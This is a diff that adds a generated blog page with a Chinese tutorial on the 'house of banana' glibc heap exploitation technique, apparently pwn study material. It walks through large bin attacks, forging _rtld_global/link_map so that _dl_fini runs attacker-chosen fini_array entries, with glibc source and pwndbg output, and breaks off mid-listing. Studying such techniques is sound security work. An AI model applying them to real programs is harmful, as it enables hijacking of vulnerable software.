@@ -1,32 +1,586 @@
-extends includes/layout.pug
 
-block content
-  #post
-    if top_img === false
-      include includes/header/post-info.pug
 
-    article#article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
-        
-    if theme.reward.enable && theme.reward.QR_code
-      !=partial('includes/post/reward', {}, {cache: true})
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .ads-wrap!=theme.ad.post
 
-    if theme.post_pagination
-      include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
 
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache: true})
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://wscyoulin.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://wscyoulin.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="http://wscyoulin.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+
+<link rel="canonical" href="http://wscyoulin.github.io/2022/08/22/house-of-banana/">
+
+
+
+  <title>
+house_of_banana |
+Yume Shoka = Hexo</title>
+<meta name="generator" content="Hexo 6.0.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">house_of_banana
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2022-08-22 16:21:13">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2022-08-22T16:21:13+08:00">2022-08-22</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giph4baakhj20zk0m8h5q.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclfb3vzhj20zk0m8wny.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclhpw3lwj20zk0m8gvw.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicljitigmj20zk0m87fp.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipew28b65j20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicis3attqj20zk0m8k7l.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/08/22/house-of-banana/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="John Doe">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="新版glibc的改进"><a href="#新版glibc的改进" class="headerlink" title="新版glibc的改进"></a>新版glibc的改进</h1><p>从glibc 2.28开始，增加了对unsorted bin的bk检验，使得unsorted bin attack不再可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>此时，我们可以考虑使用large bin attack，使用house of strom实现任意地址分配；然而，从glibc2.29开始，检查变得更加严格，house of strom不能用了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if (__glibc_unlikely (size &lt;= 2 * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (&quot;malloc(): invalid size (unsorted)&quot;);</span><br><span class="line">if (__glibc_unlikely (chunksize_nomask (next) &lt; 2 * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (&quot;malloc(): invalid next size (unsorted)&quot;);</span><br><span class="line">if (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">  malloc_printerr (&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;);</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">  malloc_printerr (&quot;malloc(): unsorted double linked list corrupted&quot;);</span><br><span class="line">if (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">  malloc_printerr (&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>但是幸运的是large bin attack仍然可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long) size</span><br><span class="line">          == (unsigned long) chunksize_nomask (fwd))</span><br><span class="line">                    /* Always insert in the second position.  */</span><br><span class="line">                    fwd = fwd-&gt;fd;</span><br><span class="line">                  else</span><br><span class="line">                    &#123;</span><br><span class="line">                      victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                      victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  bck = fwd-&gt;bk;</span><br></pre></td></tr></table></figure>
+
+<p>然而从glibc 2.30开始，常规large bin attack方法也被封堵</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long) size</span><br><span class="line">            == (unsigned long) chunksize_nomask (fwd))</span><br><span class="line">                      /* Always insert in the second position.  */</span><br><span class="line">                      fwd = fwd-&gt;fd;</span><br><span class="line">                    else</span><br><span class="line">                      &#123;</span><br><span class="line">                        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                        if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                          malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);</span><br><span class="line">                        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                      &#125;</span><br><span class="line">                    bck = fwd-&gt;bk;</span><br><span class="line">                    if (bck-&gt;fd != fwd)</span><br><span class="line">                      malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-large-bin-attack在新版glibc中的利用"><a href="#0x03-large-bin-attack在新版glibc中的利用" class="headerlink" title="0x03 large bin attack在新版glibc中的利用"></a>0x03 large bin attack在新版glibc中的利用</h2><p>那是否意味着large bin attack不能用了呢，其实不是，以前的large bin attack手法，都是在下面第二个分支里进行</p>
+<p><img data-src="https://p3.ssl.qhimg.com/t011197cbed4f5d1848.png" alt="img"></p>
+<p>在最新版的glibc 2.32里，我们看到，第二个分支里确实封堵了以前的利用手法，但是在第一个分支里，仍然可以实现large bin attack，但是该分支利用起来，只是完成<strong>往任意地址写一个堆地址</strong>的作用，因为这里的<code>bck-&gt;bk</code>才是我们的large bin，因此分析来看，我们能够控制的也就是图中第一个分支中的<code>fwd-&gt;fd-&gt;bk_nextsize</code>，而完成写的操作是在<code>fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code> 这句中，即可以往任意地址写上这个unsorted bin chunk堆的地址。而以前旧版large bin attack是可以往<strong>任意的两个地址写两个堆地址</strong>。（摘抄自安全客）</p>
+<h1 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h1><h3 id="适用场景（满足任一条件即可）："><a href="#适用场景（满足任一条件即可）：" class="headerlink" title="适用场景（满足任一条件即可）："></a>适用场景（满足任一条件即可）：</h3><h4 id="1-程序能够显式的执行exit函数"><a href="#1-程序能够显式的执行exit函数" class="headerlink" title="1.程序能够显式的执行exit函数"></a>1.程序能够显式的执行exit函数</h4><h4 id="2-程序通过libc-start-main启动的主函数，且主函数能够结束"><a href="#2-程序通过libc-start-main启动的主函数，且主函数能够结束" class="headerlink" title="2.程序通过libc_start_main启动的主函数，且主函数能够结束"></a>2.程序通过libc_start_main启动的主函数，且主函数能够结束</h4><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>在ld.so里，存在一个_rtld_global指针，指向rtld_global结构体</p>
+<p><img data-src="https://p0.ssl.qhimg.com/t01b23a2bb2487c3f57.png" alt="img"></p>
+<p>该结构体较为复杂</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">struct rtld_global</span><br><span class="line">&#123;</span><br><span class="line">#endif</span><br><span class="line">  /* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;</span><br><span class="line">     must remain the first element.  Forever.  */</span><br><span class="line"></span><br><span class="line">/* Non-shared code has no support for multiple namespaces.  */</span><br><span class="line">#ifdef SHARED</span><br><span class="line"># define DL_NNS 16</span><br><span class="line">#else</span><br><span class="line"># define DL_NNS 1</span><br><span class="line">#endif</span><br><span class="line">  EXTERN struct link_namespaces</span><br><span class="line">  &#123;</span><br><span class="line">    /* A pointer to the map for the main map.  */</span><br><span class="line">    struct link_map *_ns_loaded;</span><br><span class="line">    /* Number of object in the _dl_loaded list.  */</span><br><span class="line">    unsigned int _ns_nloaded;</span><br><span class="line">    /* Direct pointer to the searchlist of the main object.  */</span><br><span class="line">    struct r_scope_elem *_ns_main_searchlist;</span><br><span class="line">    /* This is zero at program start to signal that the global scope map is</span><br><span class="line">       allocated by rtld.  Later it keeps the size of the map.  It might be</span><br><span class="line">       reset if in _dl_close if the last global object is removed.  */</span><br><span class="line">    unsigned int _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">    /* During dlopen, this is the number of objects that still need to</span><br><span class="line">       be added to the global scope map.  It has to be taken into</span><br><span class="line">       account when resizing the map, for future map additions after</span><br><span class="line">       recursive dlopen calls from ELF constructors.  */</span><br><span class="line">    unsigned int _ns_global_scope_pending_adds;</span><br><span class="line"></span><br><span class="line">    /* Once libc.so has been loaded into the namespace, this points to</span><br><span class="line">       its link map.  */</span><br><span class="line">    struct link_map *libc_map;</span><br><span class="line"></span><br><span class="line">    /* Search table for unique objects.  */</span><br><span class="line">    struct unique_sym_table</span><br><span class="line">    &#123;</span><br><span class="line">      __rtld_lock_define_recursive (, lock)</span><br><span class="line">      struct unique_sym</span><br><span class="line">      &#123;</span><br><span class="line">    uint32_t hashval;</span><br><span class="line">    const char *name;</span><br><span class="line">    const ElfW(Sym) *sym;</span><br><span class="line">    const struct link_map *map;</span><br><span class="line">      &#125; *entries;</span><br><span class="line">      size_t size;</span><br><span class="line">      size_t n_elements;</span><br><span class="line">      void (*free) (void *);</span><br><span class="line">    &#125; _ns_unique_sym_table;</span><br><span class="line">    /* Keep track of changes to each namespace&#x27; list.  */</span><br><span class="line">    struct r_debug _ns_debug;</span><br><span class="line">  &#125; _dl_ns[DL_NNS];</span><br><span class="line">  /* One higher than index of last used namespace.  */</span><br><span class="line">  EXTERN size_t _dl_nns;</span><br><span class="line">.................................................................................</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>其中可以看到里面有多个<code>_dl_ns</code>结构体，调试发现，该结构体存储着的实际就是elf各段的符号结构体</p>
+<p><img data-src="https://p2.ssl.qhimg.com/t014a1a2df2f9476720.png" alt="img"></p>
+<p>，类似于IDA中的段结构体</p>
+<p><img data-src="https://p0.ssl.qhimg.com/t017312b35952d01ad7.png" alt="img"></p>
+<p>我们较为关注的是fini_array段的动态链接结构体指针</p>
+<p><img data-src="https://p1.ssl.qhimg.com/t012462ff5820e0e81b.png" alt="img"></p>
+<p>该结构体实际在在_dl_fini中被使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)</span><br><span class="line">&#123;</span><br><span class="line">  ElfW(Addr) *array =</span><br><span class="line">    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">            + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">  unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">            / sizeof (ElfW(Addr)));</span><br><span class="line">  while (i-- &gt; 0)</span><br><span class="line">    ((fini_t) array[i]) ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>汇编中对应的代码如下</p>
+<p><img data-src="https://p2.ssl.qhimg.com/t018e401caf62becc99.png" alt="img"></p>
+<p>因此，伪造该结构体指针，可以使得array指向我们可控的数据区，从而布置下一系列函数，进而劫持程序的流，那么house of  banana的思想就是利用large bin  attack往rtld_global写入堆的地址，并事先在堆里伪造好rtld_global结构体，这样程序exit或者正常退出main函数时，便会执行到伪造的fini_array数组。</p>
+<p>知乎摘抄：</p>
+<h2 id="house-of-banana-1"><a href="#house-of-banana-1" class="headerlink" title="house of banana"></a>house of banana</h2><p>house of banana 是ha1vk师傅在2020年总结出来的利用链。不同于IO_str_finish和IO_str_overflow利用，banana攻击的是_rtld_global结构体中的link_map链表。</p>
+<p>攻击的位置houm是在程序结束后调用exit，或者程序由libc_start_main启动，并且主函数可以正常结束返回。（这里提到了exit，不得不提一下以往的攻击exit_hook，配合onegadget获得shell，目前为止，到glibc2.34ubuntu3依旧可以利用，但是在3.2版本下该地址没有了可写权限，所以失效了）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//2.34 0ubuntu3.2</span><br><span class="line">RAX  0x1</span><br><span class="line"> RBX  0x7ffff7fad9f8 (__elf_set___libc_atexit_element__IO_cleanup__) —▸ 0x7ffff7e26b10 (_IO_cleanup) ◂— endbr64 </span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x1</span><br><span class="line"> RDI  0x555555558148 ◂— 0x0</span><br><span class="line">```</span><br><span class="line">0x7ffff7ddd58f &lt;__run_exit_handlers+431&gt;    nop    </span><br><span class="line"> ► 0x7ffff7ddd590 &lt;__run_exit_handlers+432&gt;    call   qword ptr [rbx]               &lt;_IO_cleanup&gt;</span><br><span class="line">        rdi: 0x555555558148 ◂— 0x0</span><br><span class="line">        rsi: 0x0</span><br><span class="line">        rdx: 0x1</span><br><span class="line">        rcx: 0x0</span><br><span class="line">```</span><br><span class="line">pwndbg&gt; vmmap 0x7ffff7fad9f8</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x7ffff7fad000     0x7ffff7fb1000 r--p     4000 214000 /usr/lib/x86_64-linux-gnu/libc.so.6 +0x9f8</span><br><span class="line">pwndbg&gt; x 0x7ffff7fad9f8</span><br><span class="line">0x7ffff7fad9f8 &lt;__elf_set___libc_atexit_element__IO_cleanup__&gt;: 0xf7e26b10</span><br></pre></td></tr></table></figure>
+
+<p>house  of banana  相较于以往的攻击手法，其实思路很明确。在程序通过显式调用exit，或者main函数是由__libc_start_main唤起，并可以正常的返回时，由于动态链接的加载机制，程序中并没有exit函数的真实调用，而是要通过符号表来获得真实的函数地址。（有关动态链接延迟绑定的技术，还请自行查阅，这里不做过多的阐述。）我们联想到ret2_dl_resolve技术。</p>
+<p>下面是exit执行的一个过程</p>
+<h2 id="exit-gt-dl-fini-gt-fini-t-array-i"><a href="#exit-gt-dl-fini-gt-fini-t-array-i" class="headerlink" title="exit -&gt; _dl_fini -&gt;((fini_t) array[i]) ();"></a>exit -&gt; _dl_fini -&gt;((fini_t) array[i]) ();</h2><p>banana手法，通过伪造修改相关的表项，以达到调用后门来获得权限。这里我们重点说一下，在ubuntu3.2下利用的可行性。大多数师傅对于banana的攻击方式主要有两种，一是攻击_rtld_global这个全局符号所保存的link_map的链表。伪造整个链表，进行劫持。相关的全局变量是可以写的。后面会解释这个变量的用处。</p>
+<p><img data-src="https://pic1.zhimg.com/80/v2-aa81caf3ce7fdb69e7aabdb0155b2658_1440w.png" alt="img"></p>
+<p>另外一个与之相比破坏性比较小，更容易成功。由于link_map通过链表链接，但是在加载exit的时候，相关函数只会通过link_map-&gt;l_next指针进行相关的检查。我们可以在某个特定的位置，更改next指针，将下一以链表节点转为我们控制的地方，比如heap上。</p>
+<p>很多朋友看了上面的可能会比较蒙，下面我具体说一参数。</p>
+<p>关于link_map,我们攻击exit时，会使用到一个link_map 的链表，链表的一些信息保存在struct rtld_global结构体中，这个结构体信息很多，很繁杂，但是banana只用到了几个关键的点。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;_rtld_global</span><br><span class="line">$1 = (struct rtld_global *) 0x7f56e43b9040 &lt;_rtld_global&gt;</span><br><span class="line">    //以下是结构体信息的展开，pwndbg为我们做了整理</span><br><span class="line">pwndbg&gt; p _rtld_global</span><br><span class="line">$2 = &#123;</span><br><span class="line">  _dl_ns = &#123;&#123;</span><br><span class="line">      _ns_loaded = 0x7f56e43ba220,    //#1</span><br><span class="line">      _ns_nloaded = 4,      //#2</span><br><span class="line">      _ns_main_searchlist = 0x7f56e43ba4e0,</span><br><span class="line">      _ns_global_scope_alloc = 0,</span><br><span class="line">      _ns_global_scope_pending_adds = 0,</span><br><span class="line">      libc_map = 0x7f56e4382000,</span><br><span class="line">      _ns_unique_sym_table = &#123;</span><br><span class="line">        lock = &#123;</span><br><span class="line">          mutex = &#123;</span><br><span class="line">            __data = &#123;</span><br><span class="line">              __lock = 0,</span><br><span class="line">              __count = 0,</span><br><span class="line">              __owner = 0,</span><br><span class="line">              __nusers = 0,</span><br><span class="line">              __kind = 1,</span><br><span class="line">              __spins = 0,</span><br><span class="line">              __elision = 0,</span><br><span class="line">              __list = &#123;</span><br><span class="line">                __prev = 0x0,</span><br><span class="line">                __next = 0x0</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            __size = &#x27;\000&#x27; &lt;repeats 16 times&gt;, &quot;\001&quot;, &#x27;\000&#x27; &lt;repeats 22 times&gt;,</span><br><span class="line">            __align = 0</span><br><span class="line">          &#125;</span><br><span class="line">....    </span><br><span class="line">  //展开数据会很多，但是只是对链表个节点信息的汇总</span><br></pre></td></tr></table></figure>
+
+<p>我们需要关注的是，</p>
+<p>#1，_ns_loaded = 0x7f56e43ba220, 这是整个链表的头节点，</p>
+<p>#2， _ns_nloaded = 4, 这里知名个这个链表的节点个数，在exit后面加载的检查中，会要求_ns_nloaded链表的节点不少于3个</p>
+<p>（后面我会给出相关的源码）</p>
+<p>然后对于每个节点，都是link_map结构体，我们利用第一个节点做一下简单说明(省略了部分无关的数据)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct link_map *)0x7f56e43ba220</span><br><span class="line">$3 = &#123;</span><br><span class="line">  l_addr = 94172888551424,</span><br><span class="line">  l_name = 0x7f56e43ba7c8 &quot;&quot;,</span><br><span class="line">  l_ld = 0x55a655922000,</span><br><span class="line">  l_next = 0x7f56e43ba7d0,   //#3</span><br><span class="line">  l_prev = 0x0,       </span><br><span class="line">  l_real = 0x7f56e43ba220,   //#3</span><br><span class="line">  l_ns = 0,</span><br><span class="line">  l_libname = 0x7f56e43ba7b0,</span><br><span class="line">  l_info = &#123;0x0, 0x55a655922010, 0x55a6559220f0, 0x55a6559220e0, 0x0, 0x55a655922090, 0x55a6559220a0, 0x55a655922120, 0x55a655922130, 0x55a655922140, 0x55a6559220b0, 0x55a6559220c0, 0x55a655922020, 0x55a655922030, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x55a655922100, 0x55a6559220d0, 0x0, 0x55a655922110, 0x55a655922160, 0x55a655922040, 0x55a655922060, 0x55a655922050, 0x55a655922070, 0x55a655922000, 0x55a655922150, 0x0, 0x0, 0x0, 0x0, 0x55a655922180, 0x55a655922170, 0x0, 0x0, 0x55a655922160, 0x0, 0x55a6559221a0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x55a655922190, 0x0 &lt;repeats 25 times&gt;, 0x55a655922080&#125;,   //#4</span><br><span class="line">  l_phdr = 0x55a65591d040,</span><br><span class="line">......</span><br><span class="line">  l_direct_opencount = 1,</span><br><span class="line">  l_type = lt_executable,</span><br><span class="line">  l_relocated = 1,</span><br><span class="line">  l_init_called = 1,     //#5</span><br><span class="line">  l_global = 1,</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们需要关注的：</p>
+<p>#3，l_next = 0x7f56e43ba7d0, ，指向下一个link_map 的指针，我们就是通过修改这个，将下一个节点劫持为我们伪造的link_map</p>
+<p>#4 , l_real = 0x7f56e43ba220 ,,指向的的自身的地址，这里也是后面需要检查的地方。</p>
+<p>#5, l_init_called = 1,简单说，就是为了绕过检查。</p>
+<p>下面是_dl_fini函数的源码（我已经删除了部分注释及代码，源码路径为glibc2.34/elf/dl-fini.c）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 